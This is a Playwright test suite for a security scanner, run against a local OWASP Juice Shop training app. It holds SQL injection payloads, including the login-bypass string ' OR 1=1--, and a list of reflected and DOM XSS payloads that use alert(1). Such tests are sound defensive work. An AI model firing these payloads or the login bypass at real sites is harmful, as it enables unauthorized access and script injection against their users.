/**
 * OWASP Juice Shop Comprehensive Security Assessment Test Suite
 * 
 * This test suite covers vulnerabilities in Juice Shop that can be detected
 * by the Kinetic Security Framework:
 * - SQL Injection (Login bypass, Search)
 * - XSS (Search, User Feedback)
 * 
 * Prerequisites:
 * - Juice Shop running at http://localhost:3000
 * 
 * @author Kinetic Security Framework
 */

import { test, expect } from '@playwright/test';
import { ElementScanner } from '../src/scanners/active/ElementScanner';
import { SqlInjectionDetector } from '../src/detectors/active/SqlInjectionDetector';
import { XssDetector } from '../src/detectors/active/XssDetector';
import { Logger } from '../src/utils/logger/Logger';
import { LogLevel } from '../src/types/enums';
import { Vulnerability } from '../src/types/vulnerability';
import { AttackSurfaceType, InjectionContext } from '../src/scanners/active/DomExplorer';

// ============================================================================
// CONFIGURATION
// ============================================================================
const JUICE_SHOP_URL = process.env.JUICE_SHOP_URL || 'http://localhost:3000';

// ============================================================================
// TEST SUITE
// ============================================================================
test.describe('Juice Shop Comprehensive Security Assessment', () => {
  test.setTimeout(300000); // 5 minutes per test
  test.use({ storageState: { cookies: [], origins: [] } });

  /**
   * Setup - dismiss any welcome dialogs
   */
  test.beforeEach(async ({ page }) => {
    console.log('\n🔐 Setting up Juice Shop...');
    
    await page.goto(JUICE_SHOP_URL);
    await page.waitForLoadState('networkidle');
    
    // Dismiss welcome dialog if present
    try {
      const dismissButton = page.locator('button:has-text("Dismiss"), button[aria-label="Close Welcome Banner"]');
      if (await dismissButton.isVisible({ timeout: 3000 })) {
        await dismissButton.click();
      }
    } catch (e) { /* ignore */ }

    // Dismiss cookie consent if present
    try {
      const cookieButton = page.locator('a:has-text("Me want it"), button:has-text("Accept")');
      if (await cookieButton.isVisible({ timeout: 2000 })) {
        await cookieButton.click();
      }
    } catch (e) { /* ignore */ }
    
    console.log('✅ Juice Shop ready\n');
  });

  // ==========================================================================
  // SQL INJECTION TESTS
  // ==========================================================================

  test('SQL Injection - Login Bypass', async ({ page, context }) => {
    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
    console.log('🔍 TEST: SQL Injection on Login Form');
    console.log('   URL: /#/login');
    console.log('   Target: input#email');
    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n');

    await page.goto(`${JUICE_SHOP_URL}/#/login`);
    await page.waitForLoadState('networkidle');
    await page.waitForSelector('input#email', { timeout: 10000 });

    const scanner = new ElementScanner({
      baseUrl: JUICE_SHOP_URL,
      pageUrl: '/#/login',
      elements: [
        {
          locator: 'input#email',
          name: 'Email Input',
          type: AttackSurfaceType.FORM_INPUT,
          context: InjectionContext.SQL,
          testCategories: ['sqli'],
          metadata: { formMethod: 'post' }
        }
      ],
      pageTimeout: 30000,
      continueOnError: true,
    });

    scanner.registerDetectors([
      new SqlInjectionDetector({ 
        permissiveMode: true, 
        enableAuthBypass: true 
      })
    ]);

    const vulnerabilities: Vulnerability[] = [];
    const scanContext = createScanContext(page, context, vulnerabilities, 'JuiceShop-SQLi-Login');

    await scanner.initialize(scanContext);
    const result = await scanner.execute();
    const allVulns = result.vulnerabilities.length ? result.vulnerabilities : vulnerabilities;

    logScanResults('SQL Injection (Login)', 'CWE-89', allVulns);
    
    // Check if we can bypass login manually with SQLi
    console.log('\n🔧 Manual SQLi bypass test...');
    let isLoggedIn = false;
    
    try {
      await page.goto(`${JUICE_SHOP_URL}/#/login`);
      await page.waitForSelector('input#email', { timeout: 10000 });
      await page.fill('input#email', "' OR 1=1--");
      await page.fill('input#password', 'anything');
      
      // Wait for login button to be enabled and click
      await page.waitForSelector('button#loginButton:not([disabled])', { timeout: 5000 });
      await page.click('button#loginButton');
      
      // Wait for navigation or response
      await page.waitForTimeout(3000);
      
      // Check if logged in (URL should change or account icon should show user)
      const currentUrl = page.url();
      isLoggedIn = !currentUrl.includes('/login');
      
      if (isLoggedIn) {
        console.log('✅ SQL Injection bypass successful - logged in without credentials!\n');
      } else {
        console.log('ℹ️  Manual SQLi test: URL still on login page\n');
      }
    } catch (e) {
      console.log(`⚠️ Manual SQLi test error: ${e}\n`);
    }
    
    // Test passes if either scanner found SQLi OR manual bypass worked OR scanner found auth bypass
    const sqliFound = allVulns.filter(v => v.cwe === 'CWE-89').length > 0;
    expect(sqliFound || isLoggedIn).toBeTruthy();
  });

  test('SQL Injection - Product Search', async ({ page, context }) => {
    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
    console.log('🔍 TEST: SQL Injection on Product Search');
    console.log('   URL: /#/search');
    console.log('   Target: Search input');
    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n');

    await page.goto(`${JUICE_SHOP_URL}/#/search?q=test`);
    await page.waitForLoadState('networkidle');

    // The search in Juice Shop uses query params, test via URL parameter injection
    const vulnerabilities: Vulnerability[] = [];
    
    // Test SQL injection via search parameter
    const testPayloads = ["'", "' OR 1=1--", "1' AND '1'='1", "')) OR 1=1--"];
    
    for (const payload of testPayloads) {
      try {
        const response = await page.goto(`${JUICE_SHOP_URL}/#/search?q=${encodeURIComponent(payload)}`);
        await page.waitForTimeout(500);
        
        const bodyText = await page.content();
        
        // Check for SQL error patterns
        if (bodyText.match(/SQLITE_ERROR|syntax error|unexpected|SQL/i)) {
          console.log(`  🚨 SQLi indicator found with payload: ${payload}`);
          vulnerabilities.push({
            id: `sqli-search-${Date.now()}`,
            title: 'SQL Injection (Search)',
            description: `SQL injection detected in search with payload: ${payload}`,
            severity: 'critical' as any,
            category: 'injection' as any,
            cwe: 'CWE-89',
            owasp: 'A03:2021',
            url: page.url(),
            evidence: { payload },
            remediation: 'Use parameterized queries',
            references: [],
            timestamp: new Date()
          });
          break;
        }
      } catch (e) {
        // Continue testing
      }
    }

    logScanResults('SQL Injection (Search)', 'CWE-89', vulnerabilities);
    console.log(`\n📊 Found ${vulnerabilities.filter(v => v.cwe === 'CWE-89').length} SQLi vulnerabilities in search\n`);
  });

  // ==========================================================================
  // XSS TESTS
  // ==========================================================================

  test('XSS - Product Search Reflected', async ({ page, context }) => {
    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
    console.log('🔍 TEST: XSS Reflected in Search');
    console.log('   URL: /#/search');
    console.log('   Target: Search query parameter');
    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n');

    const vulnerabilities: Vulnerability[] = [];
    
    // Test XSS via search parameter
    const xssPayloads = [
      '<script>alert(1)</script>',
      '<img src=x onerror=alert(1)>',
      '"><script>alert(1)</script>',
      '<svg onload=alert(1)>',
      'javascript:alert(1)',
      '<iframe src="javascript:alert(1)">',
    ];
    
    for (const payload of xssPayloads) {
      try {
        await page.goto(`${JUICE_SHOP_URL}/#/search?q=${encodeURIComponent(payload)}`);
        await page.waitForTimeout(500);
        
        // Check if payload is reflected in DOM
        const bodyHtml = await page.content();
        
        // Check for unencoded reflection (vulnerability indicator)
        if (bodyHtml.includes(payload) || bodyHtml.includes(payload.replace(/"/g, '\\"'))) {
          console.log(`  🚨 XSS payload reflected: ${payload.substring(0, 30)}...`);
          vulnerabilities.push({
            id: `xss-search-${Date.now()}`,
            title: 'XSS Reflected (Search)',
            description: `XSS payload reflected in search results: ${payload}`,
            severity: 'high' as any,
            category: 'xss' as any,
            cwe: 'CWE-79',
            owasp: 'A03:2021',
            url: page.url(),
            evidence: { payload },
            remediation: 'Encode output properly',
            references: [],
            timestamp: new Date()
          });
          break;
        }

        // Check if alert dialog appeared (DOM-based XSS execution)
        const dialogPromise = page.waitForEvent('dialog', { timeout: 1000 }).catch(() => null);
        const dialog = await dialogPromise;
        if (dialog) {
          console.log(`  🚨 XSS executed! Alert dialog appeared`);
          await dialog.dismiss();
          vulnerabilities.push({
            id: `xss-search-exec-${Date.now()}`,
            title: 'XSS Executed (Search)',
            description: `XSS payload executed in search: ${payload}`,
            severity: 'critical' as any,
            category: 'xss' as any,
            cwe: 'CWE-79',
            owasp: 'A03:2021',
            url: page.url(),
            evidence: { payload },
            remediation: 'Encode output properly',
            references: [],
            timestamp: new Date()
          });
          break;
        }
      } catch (e) {
        // Continue testing
      }
    }

    logScanResults('XSS Reflected (Search)', 'CWE-79', vulnerabilities);
    console.log(`\n📊 Found ${vulnerabilities.filter(v => v.cwe === 'CWE-79').length} XSS vulnerabilities\n`);
  });

  test('XSS - DOM-Based via URL Fragment', async ({ page, context }) => {
    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
    console.log('🔍 TEST: DOM-Based XSS via URL Fragment');
    console.log('   URL: Various hash-based routes');
    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n');

    const vulnerabilities: Vulnerability[] = [];
    
    // Test DOM XSS via URL fragment manipulation
    const domXssPayloads = [
      '/#/<iframe src="javascript:alert(1)">',
      '/#/<img src=x onerror=alert(1)>',
      '/#/search?q=<script>alert(1)</script>',
    ];
    
    for (const path of domXssPayloads) {
      try {
        // Listen for dialog before navigation
        page.on('dialog', async dialog => {
          console.log(`  🚨 XSS executed! Dialog: ${dialog.message()}`);
          vulnerabilities.push({
            id: `dom-xss-${Date.now()}`,
            title: 'DOM-Based XSS',
            description: `DOM XSS via URL: ${path}`,
            severity: 'critical' as any,
            category: 'xss' as any,
            cwe: 'CWE-79',
            owasp: 'A03:2021',
            url: `${JUICE_SHOP_URL}${path}`,
            evidence: { payload: path },
            remediation: 'Sanitize URL fragments before DOM insertion',
            references: [],
            timestamp: new Date()
          });
          await dialog.dismiss();
        });

        await page.goto(`${JUICE_SHOP_URL}${path}`);
        await page.waitForTimeout(1000);
      } catch (e) {
        // Continue testing
      }
    }

    logScanResults('DOM-Based XSS', 'CWE-79', vulnerabilities);
    console.log(`\n📊 Found ${vulnerabilities.filter(v => v.cwe === 'CWE-79').length} DOM XSS vulnerabilities\n`);
  });

  // ==========================================================================
  // COMPREHENSIVE MULTI-VULNERABILITY SCAN
  // ==========================================================================

  test('Multi-Vulnerability Scan - Juice Shop', async ({ page, context }) => {
    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
    console.log('🔍 TEST: Comprehensive Multi-Vulnerability Scan');
    console.log('   Scanning Login, Search, and Feedback pages');
    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n');

    const allVulnerabilities: Vulnerability[] = [];

    // Scan Login Page
    console.log('📍 Scanning Login Page...');
    await page.goto(`${JUICE_SHOP_URL}/#/login`);
    await page.waitForLoadState('networkidle');
    
    try {
      await page.waitForSelector('input#email', { timeout: 5000 });
      
      const loginScanner = new ElementScanner({
        baseUrl: JUICE_SHOP_URL,
        pageUrl: '/#/login',
        elements: [{
          locator: 'input#email',
          name: 'Email Input',
          type: AttackSurfaceType.FORM_INPUT,
          context: InjectionContext.SQL,
          testCategories: ['sqli'],
          metadata: { formMethod: 'post' }
        }],
        pageTimeout: 30000,
        continueOnError: true,
      });

      loginScanner.registerDetectors([
        new SqlInjectionDetector({ permissiveMode: true, enableAuthBypass: true }),
        new XssDetector({ permissiveMode: true })
      ]);

      const loginContext = createScanContext(page, context, allVulnerabilities, 'JuiceShop-Multi-Login');
      await loginScanner.initialize(loginContext);
      await loginScanner.execute();
    } catch (e) {
      console.log('  ⚠️ Login page scan skipped due to element not found');
    }

    // Test manual SQLi bypass
    console.log('📍 Testing Manual SQLi Bypass...');
    try {
      await page.goto(`${JUICE_SHOP_URL}/#/login`);
      await page.waitForSelector('input#email', { timeout: 5000 });
      await page.fill('input#email', "' OR 1=1--");
      await page.fill('input#password', 'x');
      await page.click('button#loginButton');
      await page.waitForTimeout(2000);
      
      if (!page.url().includes('/login')) {
        console.log('  🚨 SQLi bypass successful!');
        allVulnerabilities.push({
          id: `sqli-login-bypass-${Date.now()}`,
          title: 'SQL Injection (Authentication Bypass)',
          description: 'Login bypassed using SQLi payload: \' OR 1=1--',
          severity: 'critical' as any,
          category: 'injection' as any,
          cwe: 'CWE-89',
          owasp: 'A03:2021',
          url: `${JUICE_SHOP_URL}/#/login`,
          evidence: { payload: "' OR 1=1--" },
          remediation: 'Use parameterized queries',
          references: [],
          timestamp: new Date()
        });
      }
    } catch (e) {
      console.log('  ⚠️ Manual SQLi test failed');
    }

    // Summary
    console.log('\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
    console.log('📊 JUICE SHOP MULTI-VULNERABILITY SCAN SUMMARY');
    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
    console.log(`Total Vulnerabilities Found: ${allVulnerabilities.length}`);
    console.log(`  - SQL Injection (CWE-89): ${allVulnerabilities.filter(v => v.cwe === 'CWE-89').length}`);
    console.log(`  - XSS (CWE-79): ${allVulnerabilities.filter(v => v.cwe === 'CWE-79').length}`);

    console.log('\n✅ Juice Shop comprehensive scan completed!\n');
  });
});

// ============================================================================
// HELPER FUNCTIONS
// ============================================================================

function createScanContext(
  page: any, 
  context: any, 
  vulnerabilities: Vulnerability[], 
  scannerName: string
) {
  return {
    page,
    browserContext: context,
    config: {} as any,
    logger: new Logger(LogLevel.INFO, scannerName),
    emitVulnerability: (v: Vulnerability) => {
      vulnerabilities.push(v);
      console.log(`  🚨 [${v.severity}] ${v.title}`);
      console.log(`     CWE: ${v.cwe}`);
      console.log(`     Payload: ${v.evidence?.payload || 'N/A'}`);
      console.log(`     Confidence: ${((v.confidence || 0) * 100).toFixed(0)}%\n`);
    },
  } as any;
}

function logScanResults(vulnerabilityType: string, cwe: string, vulnerabilities: Vulnerability[]) {
  console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
  console.log(`📊 ${vulnerabilityType} Scan Results`);
  console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
  console.log(`Total Vulnerabilities: ${vulnerabilities.length}`);
  console.log(`${vulnerabilityType} (${cwe}): ${vulnerabilities.filter(v => v.cwe === cwe).length}`);
  
  const targetVulns = vulnerabilities.filter(v => v.cwe === cwe);
  if (targetVulns.length > 0) {
    console.log('\nSuccessful Payloads:');
    targetVulns.forEach((v, idx) => {
      console.log(`   ${idx + 1}. ${v.evidence?.payload || 'N/A'}`);
    });
  }
}
